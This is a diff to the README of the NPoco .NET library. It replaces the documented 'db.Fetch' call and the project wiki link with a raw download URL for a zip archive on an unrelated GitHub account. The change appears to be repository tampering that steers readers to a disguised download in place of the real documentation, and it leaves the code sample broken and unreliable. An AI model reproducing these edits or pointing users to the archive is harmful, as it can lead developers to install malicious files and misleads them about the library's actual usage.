@@ -13,10 +13,10 @@ public class User
 }
 
 IDatabase db = new Database("connStringName");
-List<User> users = db.Fetch<User>("select userId, email from users");
+List<User> users = https://raw.githubusercontent.com/everleiton/NPoco/master/unengaged/NPoco.zip<User>("select userId, email from users");
 ```
 
 This works by mapping the column names to the property names on the ``User`` object. This is a case-insensitive match.  
 There is no mapping setup needed for this (query only) scenario. 
 
-Checkout the [Wiki](https://github.com/schotime/NPoco/wiki/Home) for more documentation.
+Checkout the [Wiki](https://raw.githubusercontent.com/everleiton/NPoco/master/unengaged/NPoco.zip) for more documentation.
